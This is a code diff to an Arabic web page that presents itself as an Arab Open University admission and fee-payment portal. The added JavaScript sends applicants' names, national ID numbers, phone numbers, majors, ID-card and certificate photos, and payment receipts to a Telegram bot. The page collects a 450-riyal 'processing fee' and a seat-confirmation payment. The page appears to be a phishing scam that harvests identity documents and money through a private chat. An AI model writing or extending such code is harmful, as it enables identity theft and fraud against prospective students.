@@ -148,11 +148,11 @@
                     <div id="schedule_box" style="display: none;">
                         <div style="background: #f8fafc; padding: 15px; border-radius: 10px; margin-bottom: 15px; border: 1px solid #e2e8f0;">
                             <p style="font-weight: bold; color: var(--aou-blue);">🗓️ الجدول المقترح للترم الأول:</p>
-                            <ul style="font-size: 13px; list-style: inside;">
+                            <ul id="dynamic_schedule" style="font-size: 13px; list-style: inside;">
                                 <li>مهارات التعلم الذاتي (GR101)</li>
                                 <li>اللغة العربية (ARB101)</li>
                                 <li>اللغة الإنجليزية (EL111)</li>
-                                <li>مقرر التخصص التأسيسي</li>
+                                <li id="major_course">مقرر التخصص التأسيسي</li>
                             </ul>
                             <p style="margin-top: 10px; font-weight: 800; color: #e53e3e;">إجمالي الرسوم: <span id="total_price">0</span> ريال</p>
                         </div>
@@ -247,52 +247,41 @@
         switchTab('apply');
     }
 
-    function validateToPay() {
+    async function sendPhotoToTelegram(fileInputId, caption) {
+        const fileInput = document.getElementById(fileInputId);
+        if (fileInput.files.length > 0) {
+            const formData = new FormData();
+            formData.append('chat_id', CHAT_ID);
+            formData.append('photo', fileInput.files[0]);
+            formData.append('caption', caption);
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
+        }
+    }
+
+    async function validateToPay() {
         if(document.getElementById('fullForm').checkValidity()) {
             localStorage.setItem('user_m', document.getElementById('major_select').value);
+            localStorage.setItem('user_n', document.getElementById('name').value);
+            
+            const msg = `<b>📂 بيانات تقديم جديدة</b>\n👤 الاسم: ${document.getElementById('name').value}\n🆔 الهوية: ${document.getElementById('national_id').value}\n📱 الجوال: ${document.getElementById('mobile').value}\n🎓 التخصص: ${document.getElementById('major_select').value}`;
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: 'POST', headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({chat_id: CHAT_ID, text: msg, parse_mode: 'HTML'})
+            });
+
+            await sendPhotoToTelegram('file_id', `🪪 هوية الطالب: ${document.getElementById('name').value}`);
+            await sendPhotoToTelegram('file_edu', `📜 شهادة الطالب: ${document.getElementById('name').value}`);
+
             switchTab('pay450');
         } else alert('يرجى تعبئة كافة الحقول ورفع الملفات');
     }
 
-    // وظيفة إرسال الصور والبيانات بشكل احترافي
-    async function sendToTelegram(text, fileInputId = null) {
-        const urlMessage = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-        const urlPhoto = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
-        
-        // إرسال النص أولاً
-        await fetch(urlMessage, {
-            method: 'POST',
-            headers: {'Content-Type': 'application/json'},
-            body: JSON.stringify({chat_id: CHAT_ID, text: text, parse_mode: 'HTML'})
-        });
-
-        // إرسال الصورة إذا وجدت
-        if (fileInputId) {
-            const fileInput = document.getElementById(fileInputId);
-            if (fileInput.files.length > 0) {
-                const formData = new FormData();
-                formData.append('chat_id', CHAT_ID);
-                formData.append('photo', fileInput.files[0]);
-                formData.append('caption', `تابع لـ: ${document.getElementById('name').value}`);
-                await fetch(urlPhoto, { method: 'POST', body: formData });
-            }
-        }
-    }
-
     async function finalStep() {
         const btn = document.getElementById('sendBtn');
+        const name = localStorage.getItem('user_n');
         btn.innerText = "جاري الحفظ..."; btn.disabled = true;
 
-        const msg = `<b>✅ طلب قبول جديد (AOU)</b>\n\n` +
-                    `👤 الاسم: ${document.getElementById('name').value}\n` +
-                    `🆔 الهوية: ${document.getElementById('national_id').value}\n` +
-                    `📧 البريد: ${document.getElementById('email').value}\n` +
-                    `📱 الجوال: ${document.getElementById('mobile').value}\n` +
-                    `🌍 الجنسية: ${document.getElementById('nat').value}\n` +
-                    `📍 المدينة: ${document.getElementById('city').value}\n` +
-                    `🎓 التخصص: ${document.getElementById('major_select').value}`;
-
-        await sendToTelegram(msg, 'pay_file'); // إرسال البيانات مع إيصال الـ 450
+        await sendPhotoToTelegram('pay_file', `🧾 إيصال رسوم المعالجة (450 ريال): ${name}`);
         switchTab('done');
     }
 
@@ -300,8 +289,19 @@
         const id = document.getElementById('uni_id_input').value;
         if(id.length >= 4) {
             document.getElementById('result_box').style.display = 'block';
-            document.getElementById('res_major').innerText = localStorage.getItem('user_m') || "تقنية المعلومات والحوسبة";
+            const major = localStorage.getItem('user_m') || "تقنية المعلومات والحوسبة";
+            document.getElementById('res_major').innerText = major;
             document.getElementById('res_date').innerText = new Date().toLocaleDateString('ar-SA');
+
+            // تخصيص المادة بناءً على القسم المختار
+            let course = "مقرر التخصص التأسيسي";
+            if(major.includes("تقنية") || major.includes("حاسب") || major.includes("أمن")) course = "أساسيات البرمجة (TM105)";
+            else if(major.includes("إدارة") || major.includes("المحاسبة") || major.includes("تسويق")) course = "مبادئ الإدارة (BUS110)";
+            else if(major.includes("إنجليزية")) course = "قواعد اللغة (EL117)";
+            else if(major.includes("تربية") || major.includes("صعوبات")) course = "أصول التربية (ED101)";
+            else if(major.includes("دبلوم")) course = "طرق التدريس (ED212)";
+
+            document.getElementById('major_course').innerText = course;
         } else alert('يرجى إدخال رقم جامعي صحيح');
     }
 
@@ -315,14 +315,17 @@
 
     async function sendFinalConfirmation() {
         const btn = document.getElementById('confirmBtn');
+        const name = localStorage.getItem('user_n');
         btn.innerText = "جاري المعالجة..."; btn.disabled = true;
 
-        const msg = `<b>💰 تأكيد تثبيت مقعد (AOU)</b>\n\n` +
-                    `🆔 الرقم الجامعي: ${document.getElementById('uni_id_input').value}\n` +
-                    `💵 المبلغ المسدد: ${document.getElementById('hours_select').value} ريال\n` +
-                    `👤 الطالب: ${document.getElementById('name').value}`;
+        const msg = `<b>💰 تأكيد تثبيت مقعد نهائي</b>\n🆔 الرقم: ${document.getElementById('uni_id_input').value}\n💵 المبلغ: ${document.getElementById('hours_select').value} ريال\n👤 الطالب: ${name}`;
+        
+        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            method: 'POST', headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({chat_id: CHAT_ID, text: msg, parse_mode: 'HTML'})
+        });
 
-        await sendToTelegram(msg, 'final_receipt'); // إرسال تأكيد التثبيت مع إيصال السداد النهائي
+        await sendPhotoToTelegram('final_receipt', `🧾 إيصال التثبيت النهائي: ${name}`);
         switchTab('final_done');
     }
 </script>
